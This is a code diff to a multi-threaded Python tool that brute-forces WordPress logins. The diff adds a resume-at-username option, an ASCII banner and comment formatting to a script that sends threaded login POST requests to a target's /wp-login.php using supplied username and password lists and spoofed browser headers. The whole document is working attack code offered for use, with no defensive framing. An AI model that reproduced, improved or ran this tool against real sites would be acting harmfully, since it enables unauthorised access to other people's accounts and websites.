@@ -8,10 +8,10 @@ import threading
 from itertools import *
 import urllib
 
-######################
-#
-#       CONFIG
-#
+#######################
+#                     #
+#       CONFIG        #
+#                     #
 #######################
 
 
@@ -23,9 +23,9 @@ defaultThreadLimit = 10
 
 
 ########################
-#
-#       FUNCTIONS
-#
+#                      #
+#       FUNCTIONS      #
+#                      #
 ########################
 
 def pprint(message):
@@ -50,12 +50,6 @@ def mapcount(filename):
     return lines
 
 
-headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) '
-                         'Chrome/58.0.3029.110 Safari/537.36',
-           'Content-type': 'application/x-www-form-urlencoded',
-           'Cookie': 'wordpress_test_cookie=WP+Cookie+check'}
-
-
 def tryCombo(username, usernameNum, password, passwordNum):
     resultText = "Username [" + str(usernameNum) + "/" + str(totalEmails) + "] | Password [" + str(
         passwordNum) + "/" + str(totalPasswords) + "] :: " + username + " : " + password.rstrip()
@@ -64,6 +58,11 @@ def tryCombo(username, usernameNum, password, passwordNum):
             'pwd': password,
             'wp-submit': 'Login',
             'testcookie': '1'}
+
+    headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) '
+                         'Chrome/58.0.3029.110 Safari/537.36',
+           'Content-type': 'application/x-www-form-urlencoded',
+           'Cookie': 'wordpress_test_cookie=WP+Cookie+check'}
 
     try:
         r = requests.post(target, data=urllib.urlencode(body), headers=headers)
@@ -80,9 +79,6 @@ def tryCombo(username, usernameNum, password, passwordNum):
         print("Caught 'BadStatusLine' error. Skipping...")
 
 
-exitFlag = 0
-
-
 class bruteThread(threading.Thread):
     def __init__(self, email, emailNum, password, passwordNum):
         threading.Thread.__init__(self)
@@ -95,13 +91,37 @@ class bruteThread(threading.Thread):
         tryCombo(self.email, self.emailNum, self.password, self.passwordNum)
 
 
+def printBanner():
+    banner = """
+      ########  ########  ########  ######   ######
+      ##     ## ##     ## ##       ##    ## ##    ##
+      ##     ## ##     ## ##       ##       ##
+      ########  ########  ######    ######   ######
+      ##        ##   ##   ##             ##       ##
+      ##        ##    ##  ##       ##    ## ##    ##
+      ##        ##     ## ########  ######   ######
+      """
+
+    print(banner)
+
+########################
+#                      #
+#         MAIN         #
+#                      #
+########################
+
+exitFlag = 0
+
+printBanner()
+
 # Instantiate the parser
-parser = argparse.ArgumentParser(description='')
+parser = argparse.ArgumentParser(description='press -- A multi-threaded tool for resumable Wordpress bruteforcing')
 
 # Declare arguments
 parser.add_argument('-u', '--users', required=True, help='File with usernames to try')
 parser.add_argument('-p', '--passwords', required=True, help='File of passwords to try')
 parser.add_argument('-s', '--site', required=True, help='Site to target. Full path to /wp-login.php')
+parser.add_argument('-r', '--resume', required=False, help='Username to resume bruteforcing at')
 parser.add_argument('-l', '--logfile', required=False, help='Name of log file. Default: ' + str(logFileName))
 parser.add_argument('-t', '--threads', type=int, required=False, help='Number of threads to use. Default: ' + str(defaultThreadLimit))
 
@@ -138,29 +158,38 @@ if totalPasswords % threadLimit != 0:
 f = open(args.users, 'r')
 
 e = 1  # Email address index
+groupIndex = 0
 threads = []
 
-groupIndex = 0
+foundResumeUser = False
+
 for user in f.readlines():
 
     user = user.rstrip()  # Strip /r/n
 
     p = 1  # Password index
 
-    with open(args.passwords, 'r') as g:
-        groupIndex = 0
-        while groupIndex < totalPasswords / threadLimit:  # For every group of (threadLimit) ....
-            for i in islice(g, threadLimit):  # For each password in the chunk ....
-                thread1 = bruteThread(user, e, i, p)
-                thread1.start()
-                threads.append(thread1)
-                p += 1
+    if args.resume != "" and not foundResumeUser:
+        if args.resume == user:
+            foundResumeUser = True
+            pprint(" Found resume point!")
+        else:
+            pprint(" Skipping...")
+    else:
+        with open(args.passwords, 'r') as g:
+            groupIndex = 0
+            while groupIndex < totalPasswords / threadLimit:  # For every group of (threadLimit) ....
+                for i in islice(g, threadLimit):  # For each password in the chunk ....
+                    thread1 = bruteThread(user, e, i, p)
+                    thread1.start()
+                    threads.append(thread1)
+                    p += 1
 
-            # Wait for all threads to complete
-            for t in threads:
-                t.join()
-            groupIndex += 1
+                # Wait for all threads to complete
+                for t in threads:
+                    t.join()
+                groupIndex += 1
 
-    g.close()
+        g.close()
 
     e += 1
